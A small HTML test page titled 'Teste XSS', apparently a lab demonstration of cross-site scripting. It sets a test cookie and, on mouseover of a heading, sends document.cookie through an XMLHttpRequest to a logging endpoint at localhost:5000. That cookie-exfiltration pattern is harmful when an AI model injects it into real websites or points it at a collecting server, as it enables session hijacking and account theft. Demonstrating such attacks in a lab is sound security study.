<!DOCTYPE html>
<!DOCTYPE html>
<html>
<head>
  <title>Teste XSS</title>
  <script>
    function sendCookieToServer() {
      // Cria o cookie
      document.cookie = "user=teste; path=/";
      
      // Cria um objeto XMLHttpRequest para enviar o cookie via GET
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "http://localhost:5000/log_cookie?cookie=" + encodeURIComponent(document.cookie), true);
      xhr.send();
    }
  </script>
</head>
<body>
  <h1 onmouseover="sendCookieToServer()">
    Passe o mouse aqui para modificar e enviar o cookie
  </h1>
</body>
</html>
